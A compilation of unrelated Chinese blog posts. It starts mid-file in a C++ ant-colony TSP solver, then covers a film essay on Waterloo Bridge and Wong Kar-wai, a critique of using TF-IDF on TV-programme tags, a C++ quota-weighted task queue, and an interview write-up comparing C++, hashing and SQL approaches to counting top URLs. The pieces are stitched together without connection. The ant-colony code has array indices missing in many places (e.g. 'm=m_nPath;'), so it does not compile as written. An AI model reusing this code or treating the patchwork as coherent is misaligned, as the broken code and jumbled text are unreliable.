       {

              dbTemp=rnd(0.0,dbTotal); //取一个随机数



              for (int i=0;i<N_CITY_COUNT;i++)

              {

                     if (m_nAllowedCity == 1) //城市没去过

                     {

                            dbTemp=dbTemp-prob; //这个操作相当于转动轮盘，如果对轮盘选择不熟悉，仔细考虑一下

                            if (dbTemp < 0.0) //轮盘停止转动，记下城市编号，直接跳出循环

                            {

                                   nSelectedCity=i;

                                   break;

                            }

                     }

              }

       }



       //==============================================================================

       //如果城市间的信息素非常小 ( 小到比double能够表示的最小的数字还要小 )

       //那么由于浮点运算的误差原因，上面计算的概率总和可能为0

       //会出现经过上述操作，没有城市被选择出来

       //出现这种情况，就把第一个没去过的城市作为返回结果   

       if (nSelectedCity == -1)

       {

              for (int i=0;i<N_CITY_COUNT;i++)

              {

                     if (m_nAllowedCity == 1) //城市没去过

                     {

                            nSelectedCity=i;

                            break;

                     }

              }

       }



       //==============================================================================

       //返回结果，就是城市的编号

       return nSelectedCity;

}



//蚂蚁在城市间移动

void CAnt::Move()

{

       int nCityNo=ChooseNextCity(); //选择下一个城市



       m_nPath[m_nMovedCityCount]=nCityNo; //保存蚂蚁走的路径

       m_nAllowedCity[nCityNo]=0;//把这个城市设置成已经去过了

       m_nCurCityNo=nCityNo; //改变当前所在城市为选择的城市

       m_nMovedCityCount++; //已经去过的城市数量加1

}



//蚂蚁进行搜索一次

void CAnt::Search()

{

       Init(); //蚂蚁搜索前，先初始化



       //如果蚂蚁去过的城市数量小于城市数量，就继续移动

       while (m_nMovedCityCount < N_CITY_COUNT)

       {

              Move();

       }



       //完成搜索后计算走过的路径长度

       CalPathLength();

}





//计算蚂蚁走过的路径长度

void CAnt::CalPathLength()

{



       m_dbPathLength=0.0; //先把路径长度置0

       int m=0;

       int n=0;



       for (int i=1;i<N_CITY_COUNT;i++)

       {

              m=m_nPath;

              n=m_nPath[i-1];

              m_dbPathLength=m_dbPathLength+g_Distance[m][n];

       }



       //加上从最后城市返回出发城市的距离

       n=m_nPath[0];

       m_dbPathLength=m_dbPathLength+g_Distance[m][n]; 



}



//=====================================================================

//TSP类的定义和实现

//=====================================================================



//tsp类

class CTsp

{

public:

       CTsp(void);

       ~CTsp(void);



public:

       CAnt m_cAntAry[N_ANT_COUNT]; //蚂蚁数组

       CAnt m_cBestAnt; //定义一个蚂蚁变量，用来保存搜索过程中的最优结果

                                           //该蚂蚁不参与搜索，只是用来保存最优结果



public:



       //初始化数据

       void InitData(); 



       //开始搜索

       void Search(); 



       //更新环境信息素

       void UpdateTrial();





};





//构造函数

CTsp::CTsp(void)

{

}



CTsp::~CTsp(void)

{

}





//初始化数据

void CTsp::InitData() 

{



       //先把最优蚂蚁的路径长度设置成一个很大的值

       m_cBestAnt.m_dbPathLength=DB_MAX; 



       //计算两两城市间距离

       double dbTemp=0.0;

       for (int i=0;i<N_CITY_COUNT;i++)

       {

              for (int j=0;j<N_CITY_COUNT;j++)

              {

                     dbTemp=(x_Ary-x_Ary[j])*(x_Ary-x_Ary[j])+(y_Ary-y_Ary[j])*(y_Ary-y_Ary[j]);

                     dbTemp=pow(dbTemp,0.5);



//城市间距离四舍五入取整,eil51.tsp的最短路径426是距离按四舍五入取整后得到的。

                     g_Distance[j]=ROUND(dbTemp);

              }

       }



       //初始化环境信息素，先把城市间的信息素设置成一样

       //这里设置成1.0，设置成多少对结果影响不是太大，对算法收敛速度有些影响

       for (int i=0;i<N_CITY_COUNT;i++)

       {

              for (int j=0;j<N_CITY_COUNT;j++)

              {

                     g_Trial[j]=1.0;

              }

       }



}



//更新环境信息素

void CTsp::UpdateTrial()

{

       //临时数组，保存各只蚂蚁在两两城市间新留下的信息素

       double dbTempAry[N_CITY_COUNT][N_CITY_COUNT];

       memset(dbTempAry,0,sizeof(dbTempAry)); //先全部设置为0



       //计算新增加的信息素,保存到临时数组里

       int m=0;

       int n=0;

       for (int i=0;i<N_ANT_COUNT;i++) //计算每只蚂蚁留下的信息素

       {

                     for (int j=1;j<N_CITY_COUNT;j++)

                     {

                            m=m_cAntAry.m_nPath[j];

                            n=m_cAntAry.m_nPath[j-1];

                            dbTempAry[n][m]=dbTempAry[n][m]+DBQ/m_cAntAry.m_dbPathLength;

                            dbTempAry[m][n]=dbTempAry[n][m];

                     }



                     //最后城市和开始城市之间的信息素

                     n=m_cAntAry.m_nPath[0];

                     dbTempAry[n][m]=dbTempAry[n][m]+DBQ/m_cAntAry.m_dbPathLength;

                     dbTempAry[m][n]=dbTempAry[n][m];



       }



       //==================================================================

       //更新环境信息素

       for (int i=0;i<N_CITY_COUNT;i++)

       {

              for (int j=0;j<N_CITY_COUNT;j++)

              {

                     g_Trial[j]=g_Trial[j]*ROU+dbTempAry[j];  //最新的环境信息素 = 留存的信息素 + 新留下的信息素

              }

       }



}





void CTsp::Search()

{



       char cBuf[256]; //打印信息用



       //在迭代次数内进行循环

       for (int i=0;i<N_IT_COUNT;i++)

       {

              //每只蚂蚁搜索一遍

              for (int j=0;j<N_ANT_COUNT;j++)

              {

                     m_cAntAry[j].Search(); 

              }



              //保存最佳结果

              for (int j=0;j<N_ANT_COUNT;j++)

              {

                     if (m_cAntAry[j].m_dbPathLength < m_cBestAnt.m_dbPathLength)

                     {

                            m_cBestAnt=m_cAntAry[j];

                     }

              }



              //更新环境信息素

              UpdateTrial();



              //输出目前为止找到的最优路径的长度

              sprintf(cBuf,"\n[%d] %.0f",i+1,m_cBestAnt.m_dbPathLength);

              printf(cBuf);

       }



}



//=====================================================================

//主程序

//=====================================================================



int main()

{

       //用当前时间点初始化随机种子，防止每次运行的结果都相同

       time_t tm;

       time(&tm);

       unsigned int nSeed=(unsigned int)tm;

       srand(nSeed);



       //开始搜索

       CTsp tsp;



       tsp.InitData();  //初始化

       tsp.Search();  //开始搜索



       //输出结果

       printf("\nThe best tour is :\n");



       char cBuf[128];

       for (int i=0;i<N_CITY_COUNT;i++)

       {

              sprintf(cBuf,"%02d ",tsp.m_cBestAnt.m_nPath+1);

              if (i % 20 == 0)

              {

                     printf("\n");

              }

              printf(cBuf);

       }



       printf("\n\nPress any key to exit!");

       getchar();



       return 0;

} 




 










这个年头忍一时不见得风平浪静,退一步未必海阔天空。与其忍让不动,不如我行我素,反正得失寸惜之,苦乐独我尝
———-《新龙门客栈》

据说艺术史上最穷苦潦倒的形象非梵高莫属，他活着的时候画作鲜有买家，终日处于创作的疯癫状态。同样现今中国影坛令创作成为苦行，想看几部好片子得划拉半天搜索引擎（偷笑），有时候看的云里雾里也想考究考究，看了看书，翻了翻王家卫，有下面两段和大家分享。

1.《魂断蓝桥》的陕西血统！

《魂断蓝桥》中展现的时间是1939年9月3日，英国对德宣战，伦敦发布紧急状态令，英军上校罗伊(Roy)站在滑铁卢桥上，手持一枚吉祥符，陷入了对20年前往事的回忆。这一次横跨两次世界大战的回忆，除了表现爱情的刻骨铭心，还隐含着令人唏嘘感慨的历史感：一战无情的摧毁了罗伊的爱情，并夺走了他未婚妻玛拉(Myra)的生命，仅仅时隔20年，二战再次将他送上战场，这次他将失去什么？
Waterloo Bridge滑铁卢桥，作为爱情悲剧的见证者，从一开始两人的美丽邂逅，再到结尾Myra的绝望自杀，它既是起点，又是终点，成了表达主题的一个电影眼。Waterloo Bridge也因本片而更加闻名。根据《历史的人质———个体命运在战争电影中的经典呈现》描述说Waterloo Bridge又名伦敦桥，是一座跨越泰晤士河的九孔石桥，始建于1817年，时值英国的威灵顿公爵在比利时的滑铁卢战役中大胜拿破仑两周年，该桥便由此得名。在19世纪40年代，该桥一度成为自杀胜地。20世纪40年代，该桥开始重建，当时二战正酣，建桥工作大部分由英国妇女完成，所以有时又称“女士桥”。由于受到德国法西斯的轰炸，新桥在1942年建成后，在1945年才正式通车。
1912年的桥：

Waterloo Bridge不在滑铁卢，它也并非“蓝色”，中文片名称其为“蓝桥” ，还有一个小故事：国内引进该片时，最初直译为《滑铁卢桥》，后来又改译为《断桥残梦》，都不理想，于是编译组在全国征集片名。而一位女士为其取名为“魂断蓝桥”，终被认可。这个片名的灵感来自几乎已经被中国人淡忘了的爱情典故——据《庄子-盗跖》记载，“尾生与女子期于梁（桥）下，女子不来，水至不去，抱梁柱而死。”《史记-苏秦列传》也记载，公元前320年，苏秦向燕王讲过同样一个“尾生抱柱”的爱情故事。相传有一个叫尾生的人，与一个美丽的姑娘相约于桥下会面。但是姑娘没来，尾生为了不失约，水涨至桥面也没有离开，终抱柱而死于桥下。据《西安府志》记载，这座桥在陕西蓝田县的蓝峪水上，称为“蓝桥”。中国古代的文学艺术家以这个故事为题材创作了很多感人的作品。因此，“魂断蓝桥”是典型的意译。读完书中的如此一番考究，原来闻名世界的佳作还与陕西颇有一番渊源。
p.s. 
电影历史上三大凄美不朽的爱情影片：《魂断蓝桥》《卡萨布兰卡》《乱世佳人》,居然有两部都是费雯丽主演的。 
费雯丽： 


2.原来电影可以拍成这样！
“也许我的电影就只是一个单纯的梦。很显然，这些梦都是有所关联的，事实上他们只共有一个主题。比如说，你所讲到的桃花，它就是一个很潜在的主题，它包含的意思很单纯，并没有人们想像的那么复杂” 
                                                                                                    ——-王家卫
之前，问了一个蛮文艺的学姐她喜欢看什么样的电影，她说王家卫的基本上都看了。我想我也这么文艺，一定不能错过，所以，按着年代《旺角卡门》《阿飞正传》一路看了下去。墨镜王的电影台词写的异常精彩，觉得《重庆森林》跟《堕落天使》这两部的台词最登峰造极，《重庆森林》整部电影的台词可能就像一个都市白领的自白，金城武把跑步变成了一件私密的事情，失恋以后的梁朝伟对着整间屋子里的东西喃喃自语，看似不经意间的一句独白却给人眼前一亮似曾相识的感觉，因为可能每个人都在某时某刻不自觉的切合了电影的情节。
后面那一部呢，有一个流传以久的段子：王家卫有一次让他的演员翻译： 
 I love you，有的演员翻译成：我爱你。王说，怎么可以讲这样的话，应该是“我已经很久没有坐过摩托车了，也很久未试过这么接近一个人，虽然我知道这条路不是很远。我知道不久我就会下车。可是，这一分钟，我觉得好暖。” 便是出自《堕落天使》的结尾。

过年从图书馆抱了一堆书专业课，几十片论文，还有几本关于电影的闲书回家，最后除了闲书看完了，其他都没怎么看。《香港制造一梦十年》这本书里面说，王家卫的情绪很古怪，这种古怪最终不可避免的影响了他的电影。儿时的记忆、少年的梦想、青年时的失落情节，几乎都被演化成似是而非的影像作一番宣泄。就好像电影里周慕云写的故事，多少带了点自己身边人物的影子。王家卫是不是借他的独白说出了自己的内心事呢？
《阿飞正传》《花样年华》《2046》又被称为苏丽珍三部曲，因为电影里面都有一位重要的线索人物叫苏丽珍，他的扮演者是女神级的人物张曼玉。这几部电影似乎还有一个游离的主线： wrong time at  the wrong place with the wrong persong .

《阿飞正传》里张国荣告诉张曼玉叫她陪着自己看了整整一分钟的秒钟然后说：一九六零年四月十六号下午三点之前的一分钟你和我在一起，因为你我会记住这一分钟从现在开始我们就是一分钟的朋友，这是事实，你改变不了，因为已经过去了。我想，这个类库，完全可以供广大单身程序员在某时某刻自己要表白的情况下，大胆的调用一下嘛！！！

金城武的擦身而过：

每天你都有机会和很多人擦身而过，有些人可能会变成你的朋友或者是知己，所以我从来没有放弃任何跟人磨擦的机会。有时候搞得自己头破血流，管他呢！开心就行了。

还有一处换成了，衣服都擦破了，也没有擦出火花，我想，世间的事大砥如此了。  

张国荣的：

不如，我们从头来过！


梁朝伟的挖洞讲故事:

从前有些人，心里有了秘密，而且不想被人知道他们会跑到山上找一棵树，在树上挖一个洞，然后把秘密全说进去，再用泥把洞封上。

那秘密会留在树里，没有人知道。

一口气看完这些，原来电影可以拍成这样！ 

后记
我们观看一部影片，从某种程度上说，就是体验超越我们自身范围之外的另一种生活途径。电影本身是一种想象的产物，而我们通过电影经历一次想象的想象，这种双重的想象将我们从狭窄的生活中暂时解放出来 ——这种奇异性，正是我们喜欢电影的理由所在！——————《影像的行板》
THE END  
ALL RIGHTS RESERVED
THE STORY ABOVED IS PURELY FICTITIOUS AND ANY SIMILARITY IS PURELY COINCIDENTAL!!!

公众号，新增了评论，原创声明功能，我就想测试一下，所以拿出了几年前写的东东。大家是喜欢电影的吧，不过工作很忙，谁有时间去写影评呢？另外现在的电影又都这么烂。看完就忘了讲的什么，这又让我想起一句台词：不知道从什么时候开始，在什么东西上面都有个日期，秋刀鱼，肉罐头，连保鲜纸都会过期，我怀疑，在这个世界上，还有什么东西是不会过期的。
周一了，我们又都要上班。 
上班，又要打开电脑。 
打开电脑又要输密码。
我电脑的密码是：
爱 
你 
一 
万 
年 
！
ANYWN!

本文首发于我的公众号：老王和他的IT界朋友们 
原文链接： 
http://mp.weixin.qq.com/s?__biz=MzIyMDQwNzc5MQ==&mid=2247483859&idx=1&sn=acd8ba72d6caf96e1126e09b51881af5#rd 









作者：一人
项目中需要计算两个电视节目的相似程度，有人提出将自然语言处理当中的经典TF-IDF（Item frequency-inverse document frequency）引入作为节目的特征，然后使用余弦距离进行相似度计算。由于TF-IDF的应用领域与电视节目的信息表示不符，因此将其应用于电视节目相似度计算当中是不合适的。本文首先介绍视频语义的表示，接着对于文本语义的TF-IDF进行分析，最后描述提出的方案，解释当中的误区并做说明。
视频与文本的语义表示
视频语义的标签化表示
视频内容的提取技术有以下几种1：

对视频中物品进行识别形成序列
对视频截图的语义序列与字幕的语义序列进行结合
提取标题的关键词
人工制作视频标签

当前由于相关技术并不成熟，业界大多采用最后一种方法，人工从标签库当中选取部分作为视频内容的表示。具体节目的表示示例如下：
{
    "alias" : "伯恩的身份/叛谍追击/神鬼认证",
    "duration" : 118,
    "enName" : "The Bourne Identity",
    "language" : "英语",
    "name" : "谍影重重",
    "issue" : "2002-01-01",
    "director" : "道格·里曼",
    "cast" : "马特·达蒙/弗兰卡·波坦特/克里斯·库珀/克里夫·欧文",
    "summary" : "在这个故事中，一位失忆的人(马特-戴蒙饰)被一艘意大利渔船的人...",
    "grade_score" : 8.9,
    "tag" : "冒险/悬疑/动作/惊悚/剧情",
    "country" : "美国",
    ...
}
上面的tag字段就是对于电影《谍影重重》的语义表示。需要说明的是每个标签的放置并不代表标签的重要程度，它们对于节目的表示是等同的。
在电视节目内容提取中，对视频的语义表示形成了标签列表。而在自然语言处理当中，对文章的语义表示产生了TF-IDF。
文献语义的表示TF-IDF
引述维基百科的解释[^tfidf]

In information retrieval, tf–idf or TFIDF, short for term frequency–inverse document frequency, is a numerical statistic that is intended to reflect how important a word is to a document in a collection or corpus. It is often used as a weighting factor in searches of information retrieval, text mining, and user modeling. The tf-idf value increases proportionally to the number of times a word appears in the document and is offset by the frequency of the word in the corpus, which helps to adjust for the fact that some words appear more frequently in general.

对于它的解释说明，TF-IDF表示词语对于文献的重要程度。专业解释为词语蕴含的信息在文献信息中所占的比重2。它有以下两个特点：

一篇文档中该词出现的次数越多，它的值越大。
有该词出现的文档数目越大，它的值越小。

计算公式如下：

tf(t,d)=ft,dndtf(t,d)=ft,dndtf(t,d) = \frac{f_{t,d}} {n_d}
idf(t,D)=logN|{d∈D:t∈d}|idf(t,D)=logN|{d∈D:t∈d}|idf(t, D) = log\frac{N} {|\{d \in D: t \in d\}|}
tf−idf=tf∗idftf−idf=tf∗idftf-idf = tf * idf

ft,dft,df_{t,d}表示词ttt在文献ddd中出现的次数，ndndn_d表示文献ddd中词的个数。NNN是语料库中文献的个数，|{d∈D:t∈d}||{d∈D:t∈d}||\{d \in D: t \in d\}|表示有该词语出现的文献数目。
结果示例如下：



word
TF-IDF



我
0.0012


爱
0.0025


北京天安门
0.0128


…
…


文献语义的表示如下：
[x_0, x_1, x_2, ...] = [0.0012, 0.0025, 0.0128, ...]
这里词语“我”与“爱”在很多文档中会出现，认为它蕴含的信息量就少，因此TF-IDF值较低；“北京天安门”相较而言出现次数就少，因此认为它蕴含的信息量就大，TF-IDF值就大。
通过计算文献中每个词的TF-IDF值，最终形成的向量代表了文献的语义。
通过上面的分析我们可以得出，在文献中采用IDF计算方式的目的是为了更加准确的对文献语义进行表示。这种方式能够将语义丰富的词与语义稀少的词进行量化，追求的是词与词之间的区分度。因此，在任何想借鉴这种方式的应用中，忽略这一事实将导致不准确甚至错误的结果。
错误使用TF-IDF
混淆文本语义表示与视频语义表示
项目需求是计算两个视频相似度，采用的视频语义表示是标签化的列表。有人提出的方案是将媒体库中的所有节目当做文本语料库，将每个节目的tag（即标签化列表）作为文献，其中的每个标签作为词，计算每个标签的TF-IDF，组成视频向量，最后使用余弦公式计算视频之间的相似度。由于标签列表不会重复，tf的作用可以忽略，只有IDF发挥作用。
IDF会扭曲视频的语义表示
在视频标签列表上采用IDF方式，将会错误的扭曲视频的语义表示。我们的目标是计算视频节目的相似程度，那么节目的表示向量越准确最终的相似结果就越准确。而在视频语义的表示中我们已经确认了标签列表是一种相对准确的表示方式。如果在标签列表上采用IDF的方式，我们可以视为是对标签做权重，原来的方式视每个标签的权重为1，经过IDF之后的权重视为A (A<1)，它受出现该标签的节目数目的大小影响，即该标签在各个节目中分布的越广，则A越小。
我们知道，视频节目的语义表示直接由视频内容决定，与其他视频没有任何关系。因此，经过IDF的变化将扭曲原本准确的视频语义表示。因此这个方案是不合适的。

学习博客和公开课的知识是初学者学习的常见方式，但是不可停留在只是知道如何做，需追求对其中原理的理解。当与别人意见不一致时，更不可不假思索直接使用博客内容作为自己的证明材料，千万铭记，别人的不一定是对的，我们要以批判的角度对待别人的东西。在回顾这个内容的过程当中，吾亦受益匪浅。

呢喃，视频内容语义智能提取技术，知乎专栏，2017-05-08 
[^tfidf]: wikipedia, TF-IDF，维基百科， 2018-03-22 ↩吴军，数学之美[第11章]，2012 ↩ 








讨论帖子：


http://bbs.csdn.net/topics/391009829

解决方案：


#include <algorithm>
#include <forward_list>
#include <functional>
#include <iostream>
#include <iterator>
#include <memory>
#include <queue>
#include <random>
#include <string>
#include <unordered_map>
#include <utility>

using namespace std;

template < typename TTask >
class ManagedQueue
{
//typedefs
public:
    typedef typename queue< TTask > TaskQueue;
    typedef unordered_map< int, int > UserMap;
    typedef forward_list< int > TaskSelections;
    typedef unordered_map< int, TaskQueue > TaskQueues;
//Fields
public:
    UserMap Users;
private:
    TaskQueues tasks;   //每个用户拥有一个TaskQueue
    TaskSelections task_queues; //内含大量UID，其数量和用户配额相同
    mt19937 rng;    //随机数发生器
//Methods
private:
    //向备选队列集合中随机插入用户ID，以便Dequeue时能按配额均匀取出任务
    void RandomInsert(int user_id, int count)
    {
        uniform_int_distribution<int> dist(0, 2);
        if (task_queues.empty())
        {
            for (int i = 0; i < count; i++)
            {
                task_queues.push_front(user_id);
            }
        }
        else
        {
            while (count > 0)
            {
                for (auto i = task_queues.begin(); i != task_queues.end(); i++)
                {
                    if (dist(rng) == 1)
                    {
                        task_queues.insert_after(i, user_id);
                        count--;
                    }
                }
            }
        }
    }
public:
    //UserMap: UID -> 配额
    ManagedQueue(const UserMap& user_table)
        : Users(user_table), rng(random_device()())
    {
        //为每一个用户分配一个任务队列
        for (auto& p : user_table)
        {
            tasks.emplace(p.first, queue< TTask >());
        }
    }
    //如果添加任务前用户任务队列为空，就向备选队列集合中添加与配额相当数量的UID
    void Enqueue(int user_id, const TTask& task)
    {
        auto& q = tasks[user_id];
        bool insert_new = q.empty();
        q.push(task);
        if (insert_new)
        {
            RandomInsert(user_id, Users[user_id]);
        }
    }
    //在备选队列中随机抽一个UID，并根据UID找到对应的任务队列，从任务队列中取出任务
    //如果任务队列中没有任务，那么从备选队列集合中删除对应的UID
    TTask Dequeue()
    {
        uniform_int_distribution<int> dist(0, distance(task_queues.begin(), task_queues.end()) - 1);
        auto it = task_queues.begin();
        advance(it, dist(rng));
        auto& q = tasks[*it];
        auto ret = q.front();
        q.pop();
        if (q.empty())
        {
            task_queues.remove_if([&](int user_id) { return tasks[user_id].empty(); });
        }
        return ret;
    }
};

int main()
{
    unordered_map<int, int> user = { {1001, 10}, {1002, 20}, {1003, 40}, {1004, 30} };
    ManagedQueue<string> q(user);
    for (int i = 0; i < 1000; i++)
    {
        q.Enqueue(1001 + i % 4, string("Task ") + to_string(i % 4 + 1));
    }
    
    for (int i = 0; i < 400; i++)
    {
        cout << q.Dequeue() << "\t";
    }
    return 0;
}










内推阿里电话面试中面试官给我出的一个题：
我想的头一个解决方案，就是放到stl 的map里面对出现的频率作为pair的第二个字段进行排序，之后按照排序结果返回：
下面口说无凭，show your code，当然在讨论帖子中遭遇了工程界大牛的sql代码在技术上的碾压。什么是做工程的，什么是工程师的思维，不要一味的埋头搞算法。

讨论帖：
http://bbs.csdn.net/topics/391080906

python 抓取百度搜索结果的讨论贴：
http://bbs.csdn.net/topics/391077668

实验数据，python从百度抓得：
# -*- coding: utf-8 -*-
"""
Spyder Editor

This is a temporary script file.
"""


import urllib2 
import re 
import os

#connect to a URL 
#一页的搜索结果中url大概是200个左右
file_url = open('url.txt','ab+')
#搜索框里的东西,这块可以设置成数字好让每次搜索的结果不一样
search = '123'
url = "http://www.baidu.com/s?wd="+search


def setUrlToFile():
    website = urllib2.urlopen(url) 
    #read html code 

    html = website.read() 

    #use re.findall to get all the links 

    links = re.findall('"((http|ftp)s?://.*?)"', html)
 

    for s in links:
        print s[0]
        if len(s[0]) < 256:
            file_url.write(s[0]+'\r\n')
    
#收集实验数据
for i in range(0,50):
    setUrlToFile()

file_url.close()


###需要重新打开再读一下
file_url = open('url.txt','r')
file_lines = len(file_url.readlines())
print "there are %d url in %s" %(file_lines,file_url)
file_url.close()


方法1：
c++  写的读 url.txt放到map里面
对map<string , int>的value进行排序，得到前100个
运行一下也就55s，还是很快的，url长度进行了限制小于256个字符

#pragma once
/*
//计算代码段运行时间的类
//
*/
#include <iostream>

#ifndef ComputeTime_h
#define ComputeTime_h


//单位毫秒

class   ComputeTime    
{  
private:  
	int Initialized;  
	__int64 Frequency;  
	__int64 BeginTime;  
		    
public:  

	bool Avaliable();  
	double End();  
	bool Begin();  
	ComputeTime();  
	virtual   ~ComputeTime();    

};  






#endif
#include "stdafx.h"
#include "ComputeTime.h"
#include <iostream>
#include <Windows.h>

ComputeTime::ComputeTime()  
{  
	Initialized=QueryPerformanceFrequency((LARGE_INTEGER   *)&Frequency);  
}  
   
 ComputeTime::~ComputeTime()  
{  
		    
}  
   
 bool   ComputeTime::Begin()  
{  
	if(!Initialized)  
		return 0;

	 return   QueryPerformanceCounter((LARGE_INTEGER   *)&BeginTime);  
 }
     
 double   ComputeTime::End()
{  
	 if(!Initialized)  
		return 0;

		   
	 __int64   endtime;  
		   
	 QueryPerformanceCounter((LARGE_INTEGER   *)&endtime);  
		    
		  
	 __int64   elapsed = endtime-BeginTime;  
		    
		  
	 return   ((double)elapsed/(double)Frequency)*1000.0;  //单位毫秒
 }  

 bool   ComputeTime::Avaliable()
{  
	 return Initialized;  
}   


// sortUrl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
//#include <utility>    
#include <vector>
#include <map>
#include <fstream>
#include <iostream>
#include <string>
#include <algorithm>
#include "ComputeTime.h"

using namespace std;

map<string,int> urlfrequency;


typedef pair<string, int> PAIR;


struct CmpByValue 
{
	bool operator()(const PAIR& lhs, const PAIR& rhs) 
	{
		return lhs.second > rhs.second;
	}
};

void find_largeTH(map<string,int> urlfrequency)
{
	//把map中元素转存到vector中 ,按照value排序
	vector<PAIR> url_quency_vec(urlfrequency.begin(), urlfrequency.end());
	sort(url_quency_vec.begin(), url_quency_vec.end(), CmpByValue());
	//url_quency_vec.size()
	for (int i = 0; i != 100; ++i) 
	{
		cout<<url_quency_vec[i].first<<endl;
		cout<<url_quency_vec[i].second<<endl;
	}
}


//urlheap的建立过程，URL插入时候存在的
void insertUrl(string url)
{
	pair<map<string ,int>::iterator, bool> Insert_Pair;
	Insert_Pair = urlfrequency.insert(map<string, int>::value_type(url,1));



	if (Insert_Pair.second == false)
	{
		(Insert_Pair.first->second++);
	}
	

}


int _tmain(int argc, _TCHAR* argv[])
{
	fstream URLfile;
	char buffer[1024]; 
	URLfile.open("url.txt",ios::in|ios::out|ios::binary);

	if (! URLfile.is_open())  
	{ cout << "Error opening file"; exit (1); } 
	else
	{
	cout<<"open file success!"<<endl;
	}

	ComputeTime cp;
	cp.Begin();
	int i = 0;
	 while (!URLfile.eof())  
	{  
	URLfile.getline (buffer,1024);  
	//cout << buffer << endl;  
	string temp(buffer);
	//cout<<i++<<endl;
	insertUrl(temp);
	}  
	      


	find_largeTH(urlfrequency);

	cout<<"running time: "<<cp.End()<<"ms"<<endl;

	getchar();
	//system("pause");
	return 0;
}




实验结果：55s还不算太差，可以接受，毕竟是头脑中的第一个解决方案。



方法2：
hash code 版本，只是不知道怎么 hash和url关联起来：
// urlFind.cpp : 定义控制台应用程序的入口点。
//

// sortUrl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
 
#include <vector>
#include <map>
#include <fstream>
#include <iostream>
#include <string>
#include <algorithm>
#include <unordered_map>
#include "ComputeTime.h"

using namespace std;

map<unsigned int,int> urlhash;


typedef pair<unsigned int, int> PAIR;


struct info{
	string url;
	int cnt;
	bool operator<(const info &r) const {
		return cnt>r.cnt;
	}
};


unordered_map<string,int> count;

//priority_queue<info> pq;


struct CmpByValue 
{
	bool operator()(const PAIR& lhs, const PAIR& rhs) 
	{
		return lhs.second > rhs.second;
	}
};

void find_largeTH(map<unsigned int,int> urlhash)
{
	//把map中元素转存到vector中 ,按照value排序
	vector<PAIR> url_quency_vec(urlhash.begin(), urlhash.end());
	sort(url_quency_vec.begin(), url_quency_vec.end(), CmpByValue());
	//url_quency_vec.size()
	for (int i = 0; i != 100; ++i) 
	{
		cout<<url_quency_vec[i].first<<endl;
		cout<<url_quency_vec[i].second<<endl;
	}
}


// BKDR Hash Function
unsigned int BKDRHash(char *str)
{
	unsigned int seed = 131; // 31 131 1313 13131 131313 etc..
	unsigned int hash = 0;

	while (*str)
	{
		hash = hash * seed + (*str++);
	}

	return (hash & 0x7FFFFFFF);
}

//
void insertUrl(string url)
{

	unsigned int hashvalue = BKDRHash((char *)url.c_str());
	pair<map<unsigned int ,int>::iterator, bool> Insert_Pair;
	Insert_Pair = urlhash.insert(map<unsigned int, int>::value_type(hashvalue,1));

	if (Insert_Pair.second == false)
	{
		(Insert_Pair.first->second++);
	}


}


int _tmain(int argc, _TCHAR* argv[])
{
	fstream URLfile;
	char buffer[1024]; 
	URLfile.open("url.txt",ios::in|ios::out|ios::binary);

	if (! URLfile.is_open())  
	{ cout << "Error opening file"; exit (1); } 
	else
	{
		cout<<"open file success!"<<endl;
	}

	ComputeTime cp;
	cp.Begin();
	int i = 0;
	while (!URLfile.eof())  
	{  
		URLfile.getline (buffer,1024);  
		//cout << buffer << endl;  
		string temp(buffer);
		//cout<<i++<<endl;
		insertUrl(temp);
	}  



	find_largeTH(urlhash);

	cout<<"running time: "<<cp.End()<<"ms"<<endl;

	getchar();
	//system("pause");
	return 0;
}






性能15秒左右：缺点在于没有把hashcode和url进行关联，技术的处理速度已经非常可观了


方法3：
下面用STL的hash容器unordered_map，和优先队列(就是堆)来实现这个问题。

// urlFind.cpp : 定义控制台应用程序的入口点。
//

// sortUrl.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
 
#include <vector>
#include <map>
#include <fstream>
#include <iostream>
#include <string>
#include <algorithm>
#include <unordered_map>
#include <queue>
#include "ComputeTime.h"

using namespace std;


typedef pair<string, int> PAIR;


struct info
{
	string url;
	int cnt;
	bool operator<(const info &r) const
	{
		return cnt<r.cnt;
	}
};


unordered_map<string,int> hash_url;

priority_queue<info> pq;



void find_largeTH(unordered_map<string,int> urlhash)
{

	unordered_map<string,int>::iterator iter = urlhash.begin();
	info temp;
	for (; iter!= urlhash.end();++iter)
	{
		temp.url = iter->first;
		temp.cnt = iter->second;
		pq.push(temp);
	}

	for (int i = 0; i != 100; ++i) 
	{

		cout<<pq.top().url<<endl;
		cout<<pq.top().cnt<<endl;
		pq.pop();
	}
}



void insertUrl(string url)
{

	pair<unordered_map<string ,int>::iterator, bool> Insert_Pair;
	Insert_Pair = hash_url.insert(unordered_map<string, int>::value_type(url,1));

	if (Insert_Pair.second == false)
	{
		(Insert_Pair.first->second++);
	}

}

int _tmain(int argc, _TCHAR* argv[])
{
	fstream URLfile;
	char buffer[1024]; 
	URLfile.open("url.txt",ios::in|ios::out|ios::binary);

	if (! URLfile.is_open())  
	{ cout << "Error opening file"; exit (1); } 
	else
	{
		cout<<"open file success!"<<endl;
	}

	ComputeTime cp;
	cp.Begin();
	int i = 0;
	while (!URLfile.eof())  
	{  
		URLfile.getline (buffer,1024);  
		//cout << buffer << endl;  
		string temp(buffer);
		//cout<<i++<<endl;
		insertUrl(temp);
	}  

	find_largeTH(hash_url);

	cout<<"running time: "<<cp.End()<<"ms"<<endl;

	getchar();
	//system("pause");
	return 0;
}

基本上算是算法里面比较优秀的解决方案了，面试官如果能听到这个方案应该会比较欣喜。

﻿﻿
﻿﻿



方法4：实验耗时未知，技术上碾压了上述解决方案，中高年轻人，不要重复造轮子！哈哈
数据库，SQL语句：
load data infile "d:/bigdata.txt" into table tb_url(url);

SELECT
	url,
	count(url) as show_count
	FROM
	tb_url
	GROUP BY url
	ORDER BY show_count desc
	LIMIT 100

﻿﻿
﻿﻿
﻿﻿







